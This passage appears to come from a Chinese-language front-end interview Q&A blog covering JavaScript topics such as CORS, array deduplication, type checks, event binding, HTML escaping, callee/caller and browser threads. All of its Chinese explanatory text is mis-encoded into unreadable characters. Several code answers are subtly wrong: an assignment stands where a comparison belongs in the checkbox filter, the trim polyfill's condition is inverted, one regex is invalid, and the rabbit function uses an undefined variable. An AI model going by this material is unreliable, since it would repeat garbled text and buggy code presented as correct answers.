Sharingï¼Œè·¨é™¢èµ„æºå…±äº«ï¼‰æ˜¯ä¸€ç§å…è®¸å¤šç§èµ„æºï¼ˆå›¾ç‰‡ï¼ŒCssæ–‡å­—ï¼ŒJavascriptç­‰ï¼‰åœ¨ä¸€ä¸ªWebé¡µé¢è¯·æ±‚åŸŸä¹‹å¤–çš„å¦ä¸€ä¸ªåŸŸçš„èµ„æºçš„æœºåˆ¶ã€‚è·¨åŸŸèµ„æºå…±äº«è¿™ç§æœºåˆ¶è®©Webåº”ç”¨æœåŠ¡å™¨æ”¯æŒè·¨ç«™è®¿é—®æŽ§åˆ¶ï¼Œä»Žè€Œä½¿å¾—å®‰å…¨çš„è¿›è¡Œè·¨ç«™æ•°æ®ä¼ è¾“æˆä¸ºäº†å¯èƒ½ã€‚ é€šè¿‡è¿™ç§æœºåˆ¶è®¾ç½®ä¸€ç³»åˆ—çš„å“åº”å¤´ï¼Œè¿™äº›å“åº”å¤´å…è®¸æµè§ˆå™¨ä¸ŽæœåŠ¡å™¨è¿›è¡Œäº¤æµï¼Œå®žçŽ°èµ„æºå…±äº«ã€‚ å„è¯­è¨€è®¾ç½®å“åº”å¤´çš„æ–¹æ³• CORS è§£å†³æ–¹æ¡ˆç›¸å¯¹äºŽJSONP æ›´åŠ çµæ´»ï¼Œè€Œä¸”æ”¯æŒPOSTè¯·æ±‚ï¼Œæ˜¯è·¨åŸŸçš„æ ¹æºæ€§è§£å†³æ–¹æ¡ˆ 3ã€ä»£ç†å±‚ JSONP å’ŒCORS æ˜¯ä¸»æµçš„ è·¨åŸŸé—®é¢˜ çš„è§£å†³æ–¹æ¡ˆã€‚é™¤äº†ä»–ä»¬å‘ï¼Œè¿˜æœ‰ä¸€ç§è§£å†³æ–¹æ¡ˆï¼Œå°±æ˜¯ä»£ç†å±‚ã€‚ç®€è¦è¯´ä¸€ä¸‹ JS è°ƒç”¨æœ¬æºçš„åŽå°çš„æ–¹æ³•ï¼ˆè¿™æ ·å°±ä¸å­˜åœ¨è·¨åŸŸçš„é—®é¢˜ï¼‰ï¼Œè€Œé€šè¿‡åŽå°ï¼ˆä»»ä½•å…·æœ‰ç½‘ç»œè®¿é—®åŠŸèƒ½çš„åŽå°è¯­è¨€ï¼ŒASP.NET ,JAVA,PHPç­‰ï¼‰åŽ»è·¨åŸŸè¯·æ±‚èµ„æºï¼Œè€ŒåŽå°†ç»“æžœè¿”å›žè‡³å‰å°ã€‚ å¦å¤–ä¹Ÿå¯ä»¥çœ‹çœ‹ åŒæºç­–ç•¥ JavaScriptçš„åŒæºç­–ç•¥ Redirect 1 ç¼–å†™ä¸€ä¸ªæ•°ç»„åŽ»é‡çš„æ–¹æ³•12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849// æ–¹æ³•1 åŒé‡å¾ªçŽ¯ï¼Œé€ä¸ªåˆ¤æ–­æ•°ç»„ä¸­æŸä¸ªå…ƒç´ æ˜¯å¦ä¸Žå…¶ä»–å…ƒç´ ç›¸åŒï¼Œç›¸åŒåˆ™åŽ»æŽ‰ï¼Œå¹¶ä¸”ç´¢å¼•å‡1ï¼Œé‡å¤æ‰§è¡Œç›´åˆ°åŒé‡éåŽ†å®Œæˆfunction DuplicateRemoval(arr)&#123; for(var i = 0; i &lt; arr.length-1; i++)&#123; for(var j = i + 1; j &lt; arr.length; j++)&#123; if(arr[i] == arr[j])&#123; arr.splice(j,1); j--; &#125; &#125; &#125; return arr;&#125;var arr=[1,1,3,4,2,4,7];console.log(DuplicateRemoval(arr));// æ–¹æ³•2 å€ŸåŠ© indexOf() æ–¹æ³•åˆ¤æ–­æ­¤å…ƒç´ åœ¨è¯¥æ•°ç»„ä¸­é¦–æ¬¡å‡ºçŽ°ä½ç½®ä¸‹æ ‡ä¸Žå¾ªçŽ¯çš„ä¸‹æ ‡æ˜¯å¦ç›¸åŒfunction DuplicateRemoval(arr)&#123; for(var i = 0; i &lt; arr.length; i++)&#123; if(arr.indexOf(arr[i]) !== i)&#123; arr.splice(i,1); i-- &#125; &#125; return arr;&#125;var arr=[1,1,3,4,2,4,7];console.log(DuplicateRemoval(arr)); // æ–¹æ³•3 åˆ©ç”¨æ•°ç»„çš„æ–¹æ³• filter()var arr=[1,1,3,4,2,4,7];var result = arr.filter( (element, index, self) =&gt; self.indexOf(element) === index );console.log(result);// æ–¹æ³•4 åˆ©ç”¨æ–°æ•°ç»„ é€šè¿‡indexOfåˆ¤æ–­å½“å‰å…ƒç´ åœ¨æ•°ç»„ä¸­çš„ç´¢å¼•å¦‚æžœä¸Žå¾ªçŽ¯ç›¸åŒåˆ™æ·»åŠ åˆ°æ–°æ•°ç»„ä¸­var arr=[1,1,3,4,2,4,7];function Add(arr)&#123; var result = []; for(var i = 0; i &lt; arr.length; i++)&#123; if(arr.indexOf(arr[i]) === i)&#123; result.push(arr[i]); &#125; &#125; return result;&#125;console.log(Add(arr));// æ–¹æ³•5 ES6æ–¹æ³• Set() Setå‡½æ•°å¯ä»¥æŽ¥å—ä¸€ä¸ªæ•°ç»„ï¼ˆæˆ–ç±»ä¼¼æ•°ç»„çš„å¯¹è±¡ï¼‰ä½œä¸ºå‚æ•°ï¼Œç”¨æ¥åˆå§‹åŒ–ã€‚var arr=[1,1,3,4,2,4,7];console.log([...new Set(arr)]); JavaScript çš„æ•°æ®ç±»åž‹éƒ½æœ‰ä»€ä¹ˆåŸºæœ¬æ•°æ®ç±»åž‹ï¼šString,Boolean,number,undefined,object,Null å¼•ç”¨æ•°æ®ç±»åž‹ï¼šObjectï¼ˆArray,Date,RegExp,Functionï¼‰ ç±»åž‹æ£€æµ‹typeoftypeof è¿ç®—ç²¾åº¦åªèƒ½æ˜¯åŸºç¡€ç±»åž‹ä¹Ÿå°±æ˜¯ number ï¼Œ string ï¼Œundefined ï¼Œ boolean ï¼Œ object ï¼Œè¦æ³¨æ„çš„æ˜¯ null å’Œæ•°ç»„ä½¿ç”¨ typeof è¿ç®—ç¬¦å¾—åˆ°çš„ä¹Ÿæ˜¯ object 12345678console.log(typeof 123); // numberconsole.log(typeof 'type'); // stringconsole.log(typeof null); // objectconsole.log(typeof undefined); // undefinedconsole.log(typeof true); // booleanconsole.log(typeof []); // objectconsole.log(typeof &#123;&#125;); // objectconsole.log(typeof function()&#123;&#125;); // function instanceofç”¨äºŽåˆ¤æ–­ä¸€ä¸ªå˜é‡æ˜¯å¦æŸä¸ªå¯¹è±¡çš„å®žä¾‹,æˆ–ç”¨äºŽåˆ¤æ–­ä¸€ä¸ªå˜é‡æ˜¯å¦æŸä¸ªå¯¹è±¡çš„å®žä¾‹ instanceof è¿ç®—ç¬¦å¯ä»¥ç²¾ç¡®åˆ°æ˜¯å“ªä¸€ç§ç±»åž‹çš„å¼•ç”¨,ä½† instanceofä¹Ÿæœ‰ä¸€ä¸ªç¼ºé™·å°±æ˜¯å¯¹äºŽç›´æŽ¥èµ‹å€¼çš„æ•°å­—ï¼Œå­—ç¬¦ä¸²ï¼Œå¸ƒå°”å€¼ä»¥åŠæ•°ç»„æ˜¯ä¸èƒ½å°†å…¶è¯†åˆ«ä¸ºNumberï¼ŒStringï¼ŒBooleanï¼ŒArrayã€‚ 123456console.log(123 instanceof Number); // falseconsole.log('type' instanceof String); // falseconsole.log(true instanceof Boolean); // falseconsole.log([] instanceof Array); // trueconsole.log(&#123;&#125; instanceof Object); // trueconsole.log(function()&#123;&#125; instanceof Function); // true toString.call()12345678console.log(toString.call(123) ); // [object Number]console.log(toString.call('type')); // [object String]console.log(toString.call(null)); // [object Null]console.log(toString.call(undefined)); // [object Undefined]console.log(toString.call(true)); // [object Boolean]console.log(toString.call([])); // [object Array]console.log(toString.call(&#123;&#125;)); // [object Object]console.log(toString.call(function()&#123;&#125;)); // [object Function] constructoræž„é€ å‡½æ•°çš„å±žæ€§ ç”¨æ¥åˆ¤åˆ«å¯¹åˆ›å»ºå®žä¾‹å¯¹è±¡çš„å‡½æ•°çš„å¼•ç”¨ï¼Œå¦å¤– constructor å¯ä»¥è¢«æ”¹å†™ 12345678910111213var number = 123,string = 'type',boolean = true,arr = [],obj = &#123;&#125;,fn = function()&#123;&#125;;console.log( number.constructor); // Æ’ Number() &#123; [native code] &#125;console.log( string.constructor); // Æ’ String() &#123; [native code] &#125;console.log( boolean.constructor); // Æ’ Boolean() &#123; [native code] &#125;console.log( arr.constructor); // Æ’ Array() &#123; [native code] &#125;console.log( obj.constructor); // Æ’ Object() &#123; [native code] &#125;console.log( fn.constructor); // Æ’ Function() &#123; [native code] &#125; ä¹Ÿå¯ä»¥ç”¨ constructor.nameå°±ä¼šè¿”å›žå‡½æ•°å Object.prototype.toString.call()è¿™ä¸ªæ–¹æ³•å…¶å®žè·Ÿä¸Šé¢ toString()æ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯ä¸Šé¢é‚£ä¸ªæ–¹æ³•æœ‰å¯èƒ½ä¼šè¢«é‡å†™ã€‚æ‰€ä»¥ç”¨è¿™ä¸ªæ¯”è¾ƒç¨³å¦¥ï¼Œæ‰€æœ‰å¯¹è±¡éƒ½åŒ…å«æœ‰ä¸€ä¸ªå†…éƒ¨å±žæ€§[[Class]]ï¼Œè¿™ä¸ªå±žæ€§ä¸èƒ½ç›´æŽ¥è®¿é—®ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡Object.prototype.toString.call() 12345678console.log(Object.prototype.toString.call(123) ); // [object Number]console.log(Object.prototype.toString.call('type')); // [object String]console.log(Object.prototype.toString.call(null)); // [object Null]console.log(Object.prototype.toString.call(undefined)); // [object Undefined]console.log(Object.prototype.toString.call(true)); // [object Boolean]console.log(Object.prototype.toString.call([])); // [object Array]console.log(Object.prototype.toString.call(&#123;&#125;)); // [object Object]console.log(Object.prototype.toString.call(function()&#123;&#125;)); // [object Function] éœ€è¦æ³¨æ„çš„æ˜¯IE6/7/8ä¸­ Object.prototype.toString.apply(null)è¿”å›žâ€œ[object Object]â€ã€‚ js ä¸­innerText/value/innerHTMLä¸‰ä¸ªå±žæ€§çš„åŒºåˆ«12345678910111213141516171819202122&lt;div value = "3" id="target3"&gt; &lt;input type="text" value="1" id="target1"&gt; &lt;span id="target2" value="2"&gt;span&lt;/span&gt;&lt;/div&gt;&lt;script&gt;var a = document.getElementById("target1");var b = document.getElementById("target2");var c = document.getElementById("target3");console.log('----------');console.log(a.value); // 1console.log(a.innerHTML);console.log(a.innerText); console.log('----------');console.log(b.value); // undefinedconsole.log(b.innerHTML); // spanconsole.log(b.innerText); // span console.log('----------');console.log(c.value); // undefinedconsole.log(c.innerHTML); // &lt;input type="text" value="1" id="target1"&gt;&lt;span id="target2" value="2"&gt;span&lt;/span&gt;console.log(c.innerText); // span&lt;/script&gt; æ€»ç»“ï¼š innerTextæ˜¯æ ‡ç­¾å†…çš„æ–‡æœ¬ï¼Œè¾“å‡ºçš„æ˜¯å­—ç¬¦ä¸²ï¼Œå®ƒå¯ä»¥èŽ·å¾—æŸä¸ªèŠ‚ç‚¹ä¸‹é¢çš„æ‰€æœ‰æ ‡ç­¾å†…çš„æ–‡æœ¬ innerHtml å¯ä»¥èŽ·å¾—æŸä¸ªDOM èŠ‚ç‚¹å†…éƒ¨çš„ HTML ä»£ç  valueæ˜¯è¡¨å•å…ƒç´ çš„å±žæ€§ï¼ŒèŽ·å¾—æ˜¯è¡¨å•å…ƒç´ é‡Œé¢çš„å€¼ å¸Œæœ›èŽ·å–åˆ°é¡µé¢ä¸­æ‰€æœ‰çš„ checkboxæ€Žä¹ˆåšï¼Ÿ( ( ä¸ä½¿ç”¨ç¬¬ä¸‰æ–¹æ¡†æž¶) ) html: 123&lt;input type="checkbox"&gt;&lt;input type="checkbox"&gt;&lt;input type="checkbox"&gt; 1234567891011window.onload = function()&#123; var domList = document.getElementsByTagName('input'); var checkBoxList = []; // è¿”å›žæ‰€æœ‰çš„ checkbox var len = domList.length; // ç¼“å­˜åˆ°å±€éƒ¨å˜é‡ while(len--)&#123; if(domList[len].type = 'checkbox')&#123; checkBoxList.push(domList[len]); &#125; &#125; console.log(checkBoxList); // [input, input, input]&#125; å½“ä¸€ä¸ªDomèŠ‚ç‚¹è¢«ç‚¹å‡»æ—¶å€™ï¼Œæˆ‘ä»¬å¸Œæœ›èƒ½å¤Ÿæ‰§è¡Œä¸€ä¸ªå‡½æ•°ï¼Œåº”è¯¥æ€Žä¹ˆåšï¼Ÿ12&lt;!-- ç›´æŽ¥åœ¨ DOM é‡Œç»‘å®šäº‹ä»¶ï¼š--&gt;&lt;div onlick = "test()"&gt; 1234// åœ¨js é‡Œé¢é€šè¿‡ onclick ç»‘å®šxxx.onclick = test// åœ¨äº‹ä»¶é‡Œé¢æ·»åŠ ç»‘å®šaddEventListener(xxx, 'click', test) Javascript çš„äº‹ä»¶æµæ¨¡åž‹éƒ½æœ‰ä»€ä¹ˆï¼Ÿ â€œäº‹ä»¶å†’æ³¡â€ï¼šäº‹ä»¶å¼€å§‹ç”±æœ€å…·ä½“çš„å…ƒç´ æŽ¥å—ï¼Œç„¶åŽé€çº§å‘ä¸Šä¼ æ’­ â€œäº‹ä»¶æ•æ‰â€ï¼šäº‹ä»¶ç”±æœ€ä¸å…·ä½“çš„èŠ‚ç‚¹å…ˆæŽ¥æ”¶ï¼Œç„¶åŽé€çº§å‘ä¸‹ï¼Œä¸€ç›´åˆ°æœ€å…·ä½“çš„ â€œDOM äº‹ä»¶æµâ€ï¼šä¸‰ä¸ªé˜¶æ®µï¼Œäº‹ä»¶æ•æ‰ï¼Œç›®æ ‡é˜¶æ®µã€‚äº‹ä»¶å†’æ³¡ã€‚ å·²çŸ¥æœ‰å­—ç¬¦ä¸² foo=â€get-element-by-idâ€,å†™ä¸€ä¸ª function å°†å…¶è½¬åŒ–æˆé©¼å³°è¡¨ç¤ºæ³•â€â€”â€”getElementByIdâ€ã€‚12345678910var foo = "get-element-by-id";function combo(msg)&#123; var arr = msg.split('-'); for(var i=1;i &lt; arr.length; i++)&#123; arr[i] = arr[i].charAt(0).toUpperCase()+arr[i].substr(1,arr[i].length-1); &#125; msg = arr.join(''); return msg;&#125;console.log(combo(foo)); // getElementById è¾“å‡ºä»Šå¤©çš„æ—¥æœŸï¼Œä»¥ YYYY-MM-DD çš„æ–¹å¼1234567var date = new Date();var year = date.getFullYear();var month = date.getMonth() + 1;month = month &lt; 10 ? '0' + month : month;var day = date.getDate();day = day &lt; 10 ? '0' + day : day;console.log([year,month,day].join('-')) // 2018-11-01 å°†å­—ç¬¦ä¸² &amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;{${$name}&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;â€ ä¸­çš„ {$id} æ›¿æ¢ æˆ 10ï¼Œ {$name} æ›¿æ¢æˆ Tony ï¼ˆä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ï¼‰12var str = '&lt;tr&gt;&lt;td&gt;&#123;$id&#125;&lt;/td&gt;&lt;td&gt;&#123;$name&#125;&lt;/td&gt;&lt;/tr&gt;';str.replace(/&#123;$id&#125;/g,10).replace(/&#123;$name&#125;/,'Tony') ä¸ºäº†ä¿è¯é¡µé¢è¾“å‡ºå®‰å…¨ï¼Œæˆ‘ä»¬ç»å¸¸éœ€è¦å¯¹ä¸€äº›ç‰¹æ®Šçš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œè¯·å†™ä¸€ä¸ªå‡½æ•°123456789101112131415161718function escapeHtml(str)&#123; return str.replace(/[&lt;&gt;â€&amp;]/g,function(match)&#123; switch(match) &#123; case "&lt;": return '&amp;lt'; break; case "&gt;": return '&amp;gt' break; case "\â€": return '&amp;quot' break; case "&amp;": return '&amp;amp' break; &#125; &#125;);&#125; ç”¨ js å®žçŽ°éšæœºé€‰æ‹© 10 -100 ä¹‹é—´çš„ 101234567891011var result = [];function getRandom(start,end)&#123; var choice = end - start + 1; return Math.floor(Math.random() * choice + start);&#125;for(var i = 0; i &lt; 10; i++)&#123; var arr = getRandom(10,100); result.push(arr);&#125;console.log(result.sort( (x,y) =&gt; x - y )); æŠŠä¸¤ä¸ªæ•°ç»„åˆå¹¶ï¼Œå¹¶åˆ é™¤ç¬¬äºŒä¸ªå…ƒç´ 1234var arr1 = ['a','b','c'];var arr2 = ['d','e','f'];var result = arr1.concat(arr2);result.splice(1,1); è¯·å†™ä¸€æ®µ JS ç¨‹åºæå–URLä¸­çš„å„ä¸ª GET å‚æ•°( å‚æ•°åå’Œå‚æ•°ä¸ªæ•°ä¸ç¡®å®š ) ï¼Œ å°†å…¶æŒ‰key-value å½¢å¼è¿”å›žåˆ°ä¸€ä¸ª json ç»“æž„ä¸­12345678910111213141516const url = 'http://item.taobao.com/item.htm?a=1&amp;b=2&amp;c=&amp;d=xxx&amp;e';function serilizeUrl(url)&#123; const objUrl = &#123;&#125;; if(/?/.test(url))&#123; const urlStr = url.substring(url.indexOf('?') + 1); const urlArr = urlStr.split('&amp;'); for(let i = 0; i &lt; urlArr.length; i++)&#123; const urlItem = urlArr[i]; const item = urlItem.split('='); objUrl[item[0]] = item[1]; &#125; return objUrl; &#125; return null;&#125;console.log(serilizeUrl(url)); // &#123;a: "1", b: "2", c: "", d: "xxx", e: undefined&#125; æ­£åˆ™æž„é€ å‡½æ•°ä¸Žæ­£åˆ™è¡¨ç¤ºå­—é¢é‡Javascriptä¸­çš„æ­£åˆ™è¡¨è¾¾å¼ä¹Ÿæ˜¯å¯¹è±¡ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸¤ç§æ–¹æ³•åˆ›å»ºæ­£åˆ™è¡¨è¾¾å¼ï¼š ä½¿ç”¨new RegExp()æž„é€ å‡½æ•° ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å­—é¢é‡ å…ˆè¯´ç»“æžœï¼Œä½¿ç”¨æ­£åˆ™è¡¨è¾¾å­—é¢é‡çš„æ•ˆçŽ‡æ›´é«˜ã€‚ ä¸‹é¢çš„ç¤ºä¾‹ä»£ç æ¼”ç¤ºäº†ä¸¤ç§å¯ç”¨äºŽåˆ›å»ºæ­£åˆ™è¡¨è¾¾å¼ä»¥åŒ¹é…åæ–œæ çš„æ–¹æ³•ï¼š 123456789// æ­£åˆ™æž„é€ å‡½æ•°ä¸Žæ­£åˆ™è¡¨è¾¾å­—é¢é‡var re = /\/gm;// æ­£åˆ™æž„é€ å‡½æ•°var reg = new RegExp('\\','gm');var foo = 'abc\123';console.log(re.test(foo)); // trueconsole.log(reg.test(foo)); // true å¦‚ä¸Šé¢çš„ä»£ç ä¸­å¯ä»¥çœ‹åˆ°ï¼Œä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼å­—é¢é‡è¡¨ç¤ºæ³•æ—¶å¼å­æ˜¾å¾—æ›´åŠ ç®€çŸ­ï¼Œè€Œä¸”ä¸ç”¨æŒ‰ç…§ç±»ä¼¼ç±»ï¼ˆclass-likeï¼‰çš„æž„é€ å‡½æ•°æ–¹å¼æ€è€ƒã€‚å…¶æ¬¡ï¼Œåœ¨å½“ä½¿ç”¨æž„é€ å‡½æ•°çš„æ—¶å€™ï¼Œåœ¨è¿™é‡Œè¦ä½¿ç”¨å››ä¸ªåæ–œæ æ‰èƒ½åŒ¹é…å•ä¸ªåæ–œæ ã€‚è¿™ä½¿å¾—æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼æ˜¾å¾—æ›´é•¿ï¼Œæ›´åŠ éš¾ä»¥é˜…è¯»å’Œä¿®æ”¹ã€‚æ­£ç¡®æ¥è¯´ï¼Œå½“ä½¿ç”¨RegExp()æž„é€ å‡½æ•°çš„æ—¶å€™ï¼Œä¸ä»…éœ€è¦è½¬ä¹‰å¼•å·ï¼ˆå³\â€è¡¨ç¤ºâ€ï¼‰ï¼Œå¹¶ä¸”é€šå¸¸è¿˜éœ€è¦åŒåæ–œæ ï¼ˆå³\è¡¨ç¤ºä¸€ä¸ª\ï¼‰ã€‚ä½¿ç”¨new RegExp()çš„åŽŸå› ä¹‹ä¸€åœ¨äºŽï¼ŒæŸäº›åœºæ™¯ä¸­æ— æ³•äº‹å…ˆç¡®å®šæ¨¡å¼ï¼Œè€Œåªèƒ½åœ¨è¿è¡Œæ—¶ä»¥å­—ç¬¦ä¸²æ–¹å¼åˆ›å»ºã€‚ å†™ä¸€ä¸ªå‡½æ•°ï¼Œæ¸…é™¤å­—ç¬¦ä¸²å‰åŽçš„ç©ºæ ¼ä½¿ç”¨è‡ªå¸¦æŽ¥å£ trim()ï¼Œè€ƒè™‘å…¼å®¹æ€§ï¼š 12345678if(String.prototype.trim)&#123; String.prototype.trim = function()&#123; return this.replace(/^\s+/,"").replace(/\s+$/,""); &#125;&#125;var str = '\t\n test string '.trim();console.log(str); // test string JavaScript ä¸­ callee å’Œ callerçš„ä½œç”¨ï¼Ÿcallerè¿”å›žä¸€ä¸ªå‡½æ•°çš„å¼•ç”¨ï¼Œè¿™ä¸ªå‡½æ•°è°ƒç”¨äº†å½“å‰çš„å‡½æ•° calleeè¿”å›žæ­£åœ¨æ‰§è¡Œçš„å‡½æ•°æœ¬èº«çš„å¼•ç”¨ï¼Œå®ƒæ˜¯argumentsçš„ä¸€ä¸ªå±žæ€§ caller ä½¿ç”¨è¿™ä¸ªå±žæ€§è¦æ³¨æ„ï¼š è¿™ä¸ªå±žæ€§åªæœ‰å½“å‡½æ•°æ‰§è¡Œæ—¶æ‰æœ‰ç”¨ å¦‚æžœåœ¨js ç¨‹åºä¸­ï¼Œå‡½æ•°ç”±é¡¶çº§è°ƒç”¨ï¼Œåˆ™è¿”å›ž null 1234function fn()&#123; console.log(fn.caller);&#125;fn(); // null åŒ…è£¹ä¸€å±‚ 123456789101112131415161718function a()&#123; fn(); function fn()&#123; console.log(fn.caller); &#125;&#125;a();/** è¾“å‡ºï¼šÆ’ a()&#123; fn(); function fn()&#123; console.log(fn.caller); &#125; &#125;*/ ç»“æžœä¸º a å‡½æ•°ã€‚ å†åŒ…è£¹ä¸€å±‚ 12345678910111213141516171819function a()&#123; b(); function b()&#123; fn(); function fn()&#123; console.log(fn.caller); &#125; &#125;&#125;a();/** è¾“å‡ºï¼šÆ’ b()&#123; fn(); function fn()&#123; console.log(fn.caller); &#125; &#125;*/ ç»“æžœä¸º b å‡½æ•° callee è¦æ³¨æ„ï¼š è¿™ä¸ªå±žæ€§åªæœ‰å‡½æ•°æ‰§è¡Œæ—¶æ‰æœ‰æ•ˆ å®ƒæœ‰ä¸€ä¸ª length å±žæ€§ï¼Œå¯ä»¥ç”¨æ¥èŽ·å¾—å½¢å‚çš„ä¸ªæ•°ï¼Œå› æ­¤å¯ä»¥ç”¨æ¥æ¯”è¾ƒå½¢å‚å’Œå®žå‚ä¸ªæ•°æ˜¯å¦ä¸€è‡´ï¼Œå³æ¯”è¾ƒarguments.lengthæ˜¯å¦ç­‰äºŽ argument.callee.length å®ƒå¯ä»¥ç”¨æ¥ä¼ é€’åŒ¿åå‡½æ•° a åœ¨ b ä¸­è¢«è°ƒç”¨äº†ï¼Œä½†æ˜¯å®ƒè¿”å›žäº† a æœ¬èº«çš„å¼•ç”¨ã€‚ ä¸‹é¢æ˜¯ä¸€ä¸ªç»å…¸çš„é˜¶ä¹˜å‡½æ•° 12345678function factorial(num)&#123; if(num &lt;= 1)&#123; return 1; &#125;else&#123; return num * factorial(num - 1) &#125;&#125;console.log(factorial(120)); ä¸ºäº†é¿å…å‡½æ•°åä¿®æ”¹å¯¼è‡´å†…éƒ¨æœ‰æŠ¥é”™ï¼Œå¯ä»¥ä¿®æ”¹æˆä»¥ä¸‹å‡½æ•° 1234567function factorial(num)&#123; if(num &lt;= 1)&#123; return 1; &#125;else&#123; return num * arguments.callee(num - 1) &#125;&#125; èŽ·å¾—å½¢å‚å’Œå®žå‚ä¸ªæ•° 12345function a(num1,num2,num3)&#123; console.log(arguments.length); // å®žå‚é•¿åº¦ä¸º1 console.log(arguments.callee.length); // å½¢å‚é•¿åº¦ä¸º3&#125;a(1) å…”å­é—®é¢˜å¦‚æžœä¸€å¯¹å…”å­æ¯æœˆç”Ÿä¸€å¯¹å…”å­ï¼Œä¸€å¯¹æ–°ç”Ÿå…”å­ï¼Œä»Žç¬¬äºŒä¸ªæœˆèµ·å°±å¼€å§‹ç”Ÿå…”å­ï¼Œå‡è®¾æ¯å¯¹å…”å­éƒ½æ˜¯ä¸€é›Œä¸€é›„ï¼Œè¯•é—®ä¸€å¯¹å…”å­ï¼Œç¬¬ N ä¸ª æœˆèƒ½ç¹æ®–å¤šå°‘æˆå¯¹å¤šå°‘å¯¹å…”å­ï¼ˆä½¿ç”¨ callee å®Œæˆï¼‰ 1234567891011121314function rabbit(num)&#123; if( num === 1)&#123; return 1; &#125;else if(num === 2)&#123; return 1; &#125;else&#123; if(result[num])&#123; return result[num]; &#125;else&#123; result[num] = arguments.callee(num-1) + arguments.callee(num-2) return result[num]; &#125; &#125;&#125; ç®€è¿°åˆ›å»ºå‡½æ•°çš„å‡ ç§æ–¹å¼// ç¬¬ä¸€ç§(å‡½æ•°å£°æ˜Ž)ï¼š function sum1(num1,num2){ return num1 + num2; } // ç¬¬äºŒç§ï¼ˆå‡½æ•°è¡¨è¾¾å¼ï¼‰ var sum2 = function(num1,num2){ return num1 + num2; } // åŒ¿åå‡½æ•°ï¼šåªèƒ½è‡ªå·±æ‰§è¡Œè‡ªå·± function(){} // ç¬¬ä¸‰ç§ï¼ˆå‡½æ•°å¯¹è±¡æ–¹å¼ï¼‰ var sum3 = new Function(&quot;num1&quot;,&quot;num2&quot;,&quot;return num1 + num2&quot;); çº¿ç¨‹ä¸Žè¿›ç¨‹ è¿›ç¨‹æ˜¯ cpu èµ„æºåˆ†é…çš„æœ€å°å•ä½ï¼Œä¾‹å¦‚ä¸€ä¸ªå·¥åŽ‚ çº¿ç¨‹æ˜¯ cpu è°ƒåº¦çš„æœ€å°å•ä½ï¼Œä¾‹å¦‚ä¸€ä¸ªå·¥åŽ‚é‡Œé¢çš„nä¸ªå·¥äºº æµè§ˆå™¨å†…æ ¸æµè§ˆå™¨å†…æ ¸ä¸­æœ‰å¤šä¸ªè¿›ç¨‹åœ¨åŒæ­¥å·¥ä½œï¼Œä»Šå¤©æ¶‰åŠåˆ°çš„æµè§ˆå™¨çš„è¿›ç¨‹ä¸»è¦æœ‰ä»¥ä¸‹è¿›ç¨‹ï¼š Brower è¿›ç¨‹ã€Render è¿›ç¨‹ã€‚ Brower ä¸»è¿›ç¨‹ï¼Œä¸»è¦è´Ÿè´£é¡µé¢ç®¡ç†ä»¥åŠç®¡ç†å…¶ä»–è¿›ç¨‹çš„åˆ›å»ºå’Œé”€æ¯ç­‰ï¼Œå¸¸é©»çš„è¿›ç¨‹æœ‰ï¼š GUI æ¸²æŸ“çº¿ç¨‹ JS å¼•æ“Žçº¿ç¨‹ äº‹ä»¶è§¦å‘çº¿ç¨‹ å®šæ—¶å™¨è§¦å‘çº¿ç¨‹ HTTP è¯·æ±‚çº¿ç¨‹ GUI æ¸²æŸ“çº¿ç¨‹ ä¸»è¦è´Ÿè´£é¡µé¢çš„æ¸²æŸ“ï¼Œè§£æž HTMLã€CSS ã€æž„å»º DOM æ ‘ã€å¸ƒå±€å’Œç»˜åˆ¶ç­‰ å½“ç•Œé¢éœ€è¦é‡ç»˜æˆ–è€…ç”±äºŽæŸç§å¼•å‘å›žæµçš„æ—¶å€™ï¼Œå°†æ‰§è¡Œè¯¥çº¿ç¨‹ è¯¥çº¿ç¨‹ä¸Ž JS å¼•æ“Žçº¿ç¨‹äº’æ–¥ï¼Œå½“æ‰§è¡Œ JS å¼•æ“Žçº¿ç¨‹æ—¶ï¼ŒGUI æ¸²æŸ“ä¼šè¢«æŒ‚èµ·ï¼Œå½“ä»»åŠ¡é˜Ÿåˆ—ç©ºé—²æ—¶ï¼ŒJS å¼•æ“Žæ‰ä¼šåŽ»æ‰§è¡Œ GUI æ¸²æŸ“ JS å¼•æ“Žçº¿ç¨‹ è¯¥çº¿ç¨‹å½“ç„¶æ˜¯ä¸»è¦è´Ÿè´£å¤„ç† JavaScript è„šæœ¬ï¼Œæ‰§è¡Œä»£ç  ä¹Ÿæ˜¯ä¸»è¦æ‰§è¡Œå‡†å¤‡å¥½å¾…æ‰§è¡Œçš„äº‹ä»¶ï¼Œå³å®šæ—¶å™¨è®¡æ•°ç»“æŸï¼Œæˆ–è€…å¼‚æ­¥è¯·æ±‚æˆåŠŸå¹¶è¿”å›žæ­£ç¡®æ—¶ï¼Œå°†ä¾æ¬¡è¿›å…¥ä»»åŠ¡é˜Ÿåˆ—ï¼Œç­‰ JS å¼•æ“Žçº¿ç¨‹æ‰§è¡Œ å½“ç„¶ï¼Œè¯¥çº¿ç¨‹ä¸Ž GUI æ¸²æŸ“çº¿ç¨‹äº’æ–¥ï¼Œå½“ JS å¼•æ“Žçº¿ç¨‹æ‰§è¡Œ JavaScriptè„šæœ¬æ—¶é—´è¿‡é•¿ï¼Œå°†å¯¼è‡´é¡µé¢æ¸²æŸ“é˜»å¡ž äº‹ä»¶è§¦å‘çº¿ç¨‹ ä¸»è¦è´Ÿè´£å°†å‡†å¤‡å¥½çš„äº‹ä»¶äº¤ç»™ JS å¼•æ“Žçº¿ç¨‹æ‰§è¡Œ æ¯”å¦‚ setTimeout å®šæ—¶å™¨è®¡æ•°ç»“æŸï¼Œajax ç­‰å¼‚æ­¥è¯·æ±‚æˆåŠŸå¹¶è§¦å‘å›žè°ƒå‡½æ•°ï¼Œæˆ–è€…ç”¨æˆ·è§¦å‘ç‚¹å‡»äº‹ä»¶æ—¶ï¼Œè¯¥çº¿ç¨‹ä¼šå°†æ•´è£…å¾…å‘çš„äº‹ä»¶ä¾æ¬¡åŠ 